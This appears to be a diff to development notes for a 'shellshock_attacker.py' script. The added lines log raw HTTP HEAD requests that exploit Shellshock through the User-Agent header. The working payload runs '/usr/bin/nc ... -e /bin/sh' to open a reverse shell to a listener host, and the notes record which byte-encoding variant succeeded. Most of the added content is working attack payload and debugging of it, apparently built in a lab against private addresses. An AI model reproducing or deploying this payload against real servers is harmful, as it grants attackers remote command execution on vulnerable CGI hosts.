@@ -76,3 +76,12 @@ Netcat call is one thing which we can consider but then we won't need the revers
 When we craft this HEAD request we use pre-made payloads from the things listed (Python, etc.) in order to get a shell. We have to use a network listener using netcat. This is the stage where we simply focus on getting the HTTP requests in place with existing tools for a reverse shell. 
 
 2nd step: (This will come after we've got the HTTP requests in place and will require testing between two machines since it's a reverse shell payload
+
+shellshock_attacker.py testing notes
+
+Testing of sending different types of requests to see which one catches a shell:
+
+b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.102 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n' <- Successful
+b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc b'192.168.0.102' 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n" <- failed (Manually added IP addresses and wrapped the b'' around it so it can be interpreted as bytes. It seems the b"" which is on the outer layer of the HEAD request is the byte stream rather than any internal points. All data which is passed in which is considered a string such as an IP address should be encoded using .encode()
+
+b'HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.0.102 2222 -e /bin/sh\r\nHost: 192.168.0.100\r\nConnection: close\r\n\r\n' <- Manually added the IP without the b'' around them. In order to introduce the IP as a variable it is required to be encoded before stepping into the byte stream. This should be done internally to the function rather than externally since this has been seen to cause issues
